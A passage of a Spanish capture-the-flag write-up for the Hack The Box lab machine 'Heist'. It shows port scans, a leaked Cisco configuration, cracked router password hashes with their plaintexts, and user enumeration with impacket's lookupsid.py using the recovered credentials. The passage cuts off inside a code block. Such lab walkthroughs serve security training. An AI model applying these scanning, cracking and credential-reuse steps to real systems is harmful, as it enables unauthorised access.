            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[6, 9, 3, 7, 1],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h1&gt;
&lt;p&gt;Escaneo de puertos tcp/udp con masscan y nmap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/htb/heist# masscan -p1-65535,U:1-65535 10.10.10.149 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-08-21 06:23:36 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 49668/tcp on 10.10.10.149                                 
Discovered open port 445/tcp on 10.10.10.149                                   
Discovered open port 135/tcp on 10.10.10.149                                   
Discovered open port 5985/tcp on 10.10.10.149                                  
Discovered open port 80/tcp on 10.10.10.149

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.70 scan initiated Wed Aug 21 02:32:58 2019 as: nmap -sC -sV -p 49668,445,135,5985,80 -o nmap.scan 10.10.10.149&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.149
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.39s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-cookie-flags: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   /: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     PHPSESSID: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_      httponly flag not &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-IIS/10.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-title: Support Login Page
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Requested resource was login.php
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
49668/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: mean: 32s, deviation: 0s, median: 32s
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled but not required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2019-08-21 02:34:36
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Aug 21 02:34:42 2019 -- 1 IP address (1 host up) scanned in 103.97 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;http---puerto-80&#34;&gt;HTTP - PUERTO 80&lt;/h1&gt;
&lt;p&gt;Al visitar este puerto nos muestra un panel de inicio de sesion de una plataforma.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-21%2000.56.31.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Iniciamos sesion como invitado (Login as guest) y nos redirige a una nueva pagina &lt;code&gt;issues.php&lt;/code&gt; en la cual contiene un &lt;code&gt;chat&lt;/code&gt; de un cliente que muestra los errores que tuvo con su router cisco y una lista de errores dentro de un archivo.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-21%2000.45.35.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Archivo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nx&#34;&gt;version&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;12.2&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;no&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;service&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;pad&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;service&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;encryption&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;isdn&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;switch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;basic&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ess&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;hostname&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ios&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;security&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;passwords&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;min&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;length&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;enable&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;secret&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pdQG$o8nrSzsGXeaduXrjlvKc91&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;username&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;rout3r&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;mo&#34;&gt;0242114&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;B0E143F015F5D1E161713&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;username&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;admin&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;privilege&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;mo&#34;&gt;023750121&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;82&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;C1A1D751618034F36415408&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ssh&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;authentication&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;retries&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ssh&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;version&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;router&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;bgp&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;
 &lt;span class=&#34;nx&#34;&gt;synchronization&lt;/span&gt;
 &lt;span class=&#34;nx&#34;&gt;bgp&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;neighbor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;changes&lt;/span&gt;
 &lt;span class=&#34;nx&#34;&gt;bgp&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;dampening&lt;/span&gt;
 &lt;span class=&#34;nx&#34;&gt;network&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.0&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Â&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mask&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;300.255&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;255.0&lt;/span&gt;
 &lt;span class=&#34;nx&#34;&gt;timers&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;bgp&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt;
 &lt;span class=&#34;nx&#34;&gt;redistribute&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;connected&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;classless&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;route&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0.0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.0&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0.0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.0&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.1&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;access&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;list&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;101&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;permit&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;any&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;any&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;dialer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;list&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;protocol&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;list&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;101&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;no&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;server&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;no&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;secure&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;server&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;vty&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;
 &lt;span class=&#34;nx&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;timeout&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;600&lt;/span&gt;
 &lt;span class=&#34;nx&#34;&gt;authorization&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;exec&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;SSH&lt;/span&gt;
 &lt;span class=&#34;nx&#34;&gt;transport&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ssh&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos dentro del archivo usuarios y contraseñas:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$1$pdQG$o8nrSzsGXeaduXrjlvKc91
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;La primera contraseña la crackeamos con hashcat:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;stealth1agent:&lt;span class=&#34;nv&#34;&gt;$1$pdQG$o8nrSzsGXeaduXrjlvKc91&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Las dos ultimas utilizamos un script que nos devuelve el valor del hash, este hash es de tipo 7 de Cisco:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://www.question-defense.com/2011/08/17/perl-script-to-decode-cisco-type-7-password-hash&#34;&gt;&lt;strong&gt;Decode Cisco Password Hash&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;http://ibeast.com/tools/CiscoPassword/index.asp&#34;&gt;&lt;strong&gt;Cisco Password&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;http://www.ifm.net.nz/cookbooks/passwordcracker.html&#34;&gt;&lt;strong&gt;Password Cracker&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-27%2000.22.34.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$uperP&lt;/span&gt;@ssword:0242114B0E143F015F5D1E161713
Q4&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;sJu&lt;span class=&#34;se&#34;&gt;\Y&lt;/span&gt;8qz*A3?d:02375012182C1A1D751618034F36415408
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;smbmap&#34;&gt;SMBMAP&lt;/h1&gt;
&lt;p&gt;Ahora que tenemos usuairos y contraseñas intentamos listar sharenames, con el unico usuario con el cual nos dejó fue con el usuario &lt;strong&gt;hazard&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-27%2015.41.00.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;impacket---lookupsid&#34;&gt;IMPACKET - LOOKUPSID&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/&#34;&gt;&lt;strong&gt;Impacket toolkit&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Utilizamos el script lookupsid.py de impacket para poder obtener los usuarios o grupo de usuarios dentro de la maquina.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-27%2015.47.06.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/htb/heist/evil-winrm# lookupsid.py hazard:stealth1agent@10.10.10.149
Impacket v0.9.20-dev - Copyright &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; SecureAuth Corporation

